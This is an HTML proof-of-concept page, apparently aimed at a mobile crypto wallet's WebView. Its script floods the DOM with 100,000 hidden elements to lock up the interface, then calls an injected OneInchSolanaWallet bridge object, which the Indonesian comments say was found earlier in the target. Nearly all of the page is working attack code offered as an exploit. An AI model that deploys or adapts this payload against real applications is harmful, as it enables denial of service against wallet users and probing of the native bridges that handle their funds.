<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Business Logic Exploit: UI Lockout</title>
</head>
<body style="background: #111; color: #fff; font-family: sans-serif; text-align: center; padding: 30px;">

    <div style="border: 2px dashed #ff9500; padding: 20px; border-radius: 15px;">
        <h2 style="color: #ff9500;">⚠️ UI LOCKOUT TEST</h2>
        <p>Target: WebView Rendering Engine</p>
        
        <button onclick="domOverload()" style="padding: 20px; background: #ff9500; color: #000; border: none; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer;">
            EXECUTE DOM OVERLOAD
        </button>

        <p id="status" style="margin-top: 20px; font-size: 12px; color: #888;">Status: Ready</p>
    </div>

    <script>
    function domOverload() {
        const status = document.getElementById('status');
        status.innerText = "Generating 100,000 elements...";
        
        // Loop masif untuk membebani Rendering Engine
        for (let i = 0; i < 100000; i++) {
            const el = document.createElement('div');
            // Membuat elemen yang tidak terlihat tapi tetap harus dihitung oleh GPU/CPU
            el.style.cssText = "position:fixed; width:1px; height:1px; opacity:0.01; z-index:-1;";
            document.body.appendChild(el);
        }

        // Setelah merusak UI, kita kirim sinyal ke bridge Solana yang tadi kita temukan
        if (window.OneInchSolanaWallet) {
            window.OneInchSolanaWallet.init("DOM_OVERLOAD_COMPLETE");
        }

        status.innerText = "DOM Flooded. Check app responsiveness.";
        status.style.color = "#ff9500";
    }
    </script>

</body>
</html>
